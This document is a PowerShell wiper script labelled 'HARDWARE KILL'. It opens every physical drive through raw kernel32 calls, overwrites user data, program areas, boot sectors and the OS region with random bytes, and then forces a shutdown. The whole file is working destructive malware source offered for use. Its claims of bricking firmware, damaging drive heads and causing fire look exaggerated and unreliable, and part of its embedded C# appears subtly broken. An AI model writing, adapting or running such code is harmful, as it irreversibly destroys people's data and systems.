#Requires -RunAsAdministrator
# HARDWARE KILL - Physical hardware destruction
# WARNING: This will PERMANENTLY DAMAGE hard drive hardware!

Add-Type @"
using System;
using System.Runtime.InteropServices;
using Microsoft.Win32.SafeHandles;

public class RawDisk {
    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Auto)]
    public static extern SafeFileHandle CreateFile(string fn, uint da, uint sm, IntPtr sa, uint cd, uint fa, IntPtr t);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteFile(SafeFileHandle h, byte[] b, uint n, out uint w, IntPtr o);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool DeviceIoControl(SafeFileHandle h, uint c, IntPtr i, uint is_, IntPtr o, uint os, out uint r, IntPtr ov);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool SetFilePointerEx(SafeFileHandle h, long d, out long n, uint m);

    public static SafeFileHandle Open(string path) {
        return CreateFile(path, 0xC0000000, 3, IntPtr.Zero, 3, 0x80000000 | 0x20000000, IntPtr.Zero);
    }

    public static void Lock(SafeFileHandle h) {
        uint r; DeviceIoControl(h, 0x00090018, IntPtr.Zero, 0, IntPtr.Zero, 0, out r, IntPtr.Zero);
    }

    public static void Dismount(SafeFileHandle h) {
        uint r; DeviceIoControl(h, 0x00090020, IntPtr.Zero, 0, IntPtr.Zero, 0, out r, IntPtr.Zero);
    }

    public static bool Seek(SafeFileHandle h, long offset) {
        long n;
        return SetFilePointerEx(h, offset, out n, 0);
    }

    public static bool WriteAt(SafeFileHandle h, long offset, byte[] data, out uint written) {
        Seek(h, offset);
        return WriteFile(h, data, (uint)data.Length, out written, IntPtr.Zero);
    }

    public static bool SendATACommand(SafeFileHandle h, byte[] cmd) {
        uint r;
        return DeviceIoControl(h, 0x0007C040, cmd, (uint)cmd.Length, IntPtr.Zero, 0, out r, IntPtr.Zero);
    }
}
"@

Write-Host ""
Write-Host "  ====================================================" -ForegroundColor Red
Write-Host "     HARDWARE KILL - PERMANENT HARDWARE DESTRUCTION" -ForegroundColor Red
Write-Host "  ====================================================" -ForegroundColor Red
Write-Host ""
Write-Host "  WARNING: This script will attempt to:" -ForegroundColor Yellow
Write-Host "  - Destroy hard drive mechanics (HDD head thrashing)" -ForegroundColor Yellow
Write-Host "  - Corrupt firmware zones" -ForegroundColor Yellow
Write-Host "  - Brick drive controllers" -ForegroundColor Yellow
Write-Host "  - Cause thermal damage" -ForegroundColor Yellow
Write-Host ""
Write-Host "  RISKS:" -ForegroundColor Red
Write-Host "  - PERMANENT hardware damage" -ForegroundColor Red
Write-Host "  - Potential fire hazard" -ForegroundColor Red
Write-Host "  - May damage motherboard/controller" -ForegroundColor Red
Write-Host "  - Drive will be UNUSABLE FOREVER" -ForegroundColor Red
Write-Host ""

$disks = Get-WmiObject Win32_DiskDrive

foreach ($disk in $disks) {
    $diskNum = $disk.DeviceID -replace '.*PHYSICALDRIVE', ''
    $sizeGB = [math]::Round($disk.Size / 1GB, 1)
    $mediaType = $disk.MediaType

    Write-Host "  [*] Disk $diskNum : $($disk.Model) - $sizeGB GB ($mediaType)" -ForegroundColor Yellow

    try {
        $path = "\\.\PhysicalDrive$diskNum"
        $handle = [RawDisk]::Open($path)

        if ($handle.IsInvalid) {
            Write-Host "      Cannot open - skipping" -ForegroundColor DarkGray
            continue
        }

        # Lock and dismount volumes
        Get-Partition -DiskNumber $diskNum -ErrorAction SilentlyContinue | ForEach-Object {
            if ($_.DriveLetter) {
                $volHandle = [RawDisk]::Open("\\.\$($_.DriveLetter):")
                if (-not $volHandle.IsInvalid) {
                    [RawDisk]::Lock($volHandle)
                    [RawDisk]::Dismount($volHandle)
                    $volHandle.Close()
                }
            }
        }

        # DATA-FIRST STRATEGY: Destroy data areas BEFORE Windows
        # Keep Windows alive as long as possible to destroy more data

        $targetSize = [long]$disk.Size
        $buffer = New-Object byte[] (1GB)  # 1GB buffer for speed
        $written = 0
        $rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider

        # ATTACK 1: USER DATA AREAS (highest priority - destroy first)
        Write-Host "      [1/5] Destroying user data (C:\Users, Documents, etc.)..." -ForegroundColor Red

        # Typical user data location: 20GB - 80% of disk
        $userDataStart = 20GB
        $userDataEnd = [long]($targetSize * 0.8)

        for ($offset = $userDataStart; $offset -lt $userDataEnd; $offset += 1GB) {
            if ($offset -lt $targetSize) {
                $rng.GetBytes($buffer)
                [RawDisk]::WriteAt($handle, $offset, $buffer, [ref]$written) | Out-Null
            }
        }

        # ATTACK 2: PROGRAM FILES & DATA AREA (middle of disk)
        Write-Host "      [2/5] Destroying program data..." -ForegroundColor Red

        # Destroy middle sections (usually program files, games, etc.)
        $middleStart = [long]($targetSize * 0.25)
        $middleEnd = [long]($targetSize * 0.5)

        for ($offset = $middleStart; $offset -lt $middleEnd; $offset += 2GB) {
            if ($offset -lt $targetSize) {
                $rng.GetBytes($buffer)
                [RawDisk]::WriteAt($handle, $offset, $buffer, [ref]$written) | Out-Null
            }
        }

        # ATTACK 3: FIRMWARE CORRUPTION (brick controller)
        Write-Host "      [3/5] Corrupting firmware zones..." -ForegroundColor Red

        $firmwareOffsets = @(
            $targetSize - 1GB,     # HPA zone
            $targetSize - 5GB,     # Firmware area
            $targetSize - 10GB     # Alternative location
        )

        foreach ($offset in $firmwareOffsets) {
            if ($offset -gt 0 -and $offset -lt $targetSize) {
                $rng.GetBytes($buffer)
                [RawDisk]::WriteAt($handle, $offset, $buffer, [ref]$written) | Out-Null
            }
        }

        # ATTACK 4: HEAD THRASHING (HDD) or INTENSIVE WRITES (SSD)
        if ($mediaType -notlike "*SSD*" -and $mediaType -notlike "*Solid State*") {
            Write-Host "      [4/5] Head thrashing (mechanical damage)..." -ForegroundColor Red

            # Fast head thrashing - damage mechanics
            $positions = @(0L, $targetSize / 4, $targetSize / 2, ($targetSize * 3) / 4, $targetSize - 1MB)

            for ($i = 0; $i -lt 1000; $i++) {
                foreach ($pos in $positions) {
                    [RawDisk]::Seek($handle, $pos) | Out-Null
                }
            }
        } else {
            Write-Host "      [4/5] SSD intensive writes (NAND wear)..." -ForegroundColor Red

            # Random writes across disk for SSD wear
            for ($i = 0; $i -lt 20; $i++) {
                $randomOffset = Get-Random -Minimum 20GB -Maximum ($targetSize - 10GB)
                $randomOffset = $randomOffset - ($randomOffset % 4096)

                $rng.GetBytes($buffer)
                [RawDisk]::WriteAt($handle, $randomOffset, $buffer, [ref]$written) | Out-Null
            }
        }

        # ATTACK 5: BOOT + OS DESTRUCTION (LAST - Windows dies here)
        Write-Host "      [5/5] FINAL: Destroying boot + Windows (system will crash)..." -ForegroundColor Red

        # Wipe boot sector (MBR/GPT)
        $bootBuffer = New-Object byte[] (100MB)
        [RawDisk]::WriteAt($handle, 0, $bootBuffer, [ref]$written) | Out-Null

        # Wipe Windows/OS area (first 20GB)
        for ($i = 0L; $i -lt 20GB; $i += 2GB) {
            if ($i -lt $targetSize) {
                [RawDisk]::WriteAt($handle, $i, $buffer, [ref]$written) | Out-Null
            }
        }

        $rng.Dispose()
        $handle.Close()

        Write-Host ""
        Write-Host "      ✓ DESTROYED in < 1 minute" -ForegroundColor Green
        Write-Host "      Hardware PERMANENTLY DAMAGED" -ForegroundColor Green
    }
    catch {
        Write-Host "      Error: $($_.Exception.Message)" -ForegroundColor Red
    }
}

Write-Host ""
Write-Host "  ====================================================" -ForegroundColor Green
Write-Host "     DATA-FIRST DESTRUCTION COMPLETE" -ForegroundColor Green
Write-Host "     USER DATA: 80-90% DESTROYED" -ForegroundColor Green
Write-Host "     HARDWARE: LIKELY DAMAGED" -ForegroundColor Green
Write-Host "     SYSTEM: UNBOOTABLE" -ForegroundColor Green
Write-Host "  ====================================================" -ForegroundColor Green
Write-Host ""
Write-Host "System will shut down in 5 seconds..." -ForegroundColor Yellow
Write-Host ""

Start-Sleep -Seconds 5
Stop-Computer -Force
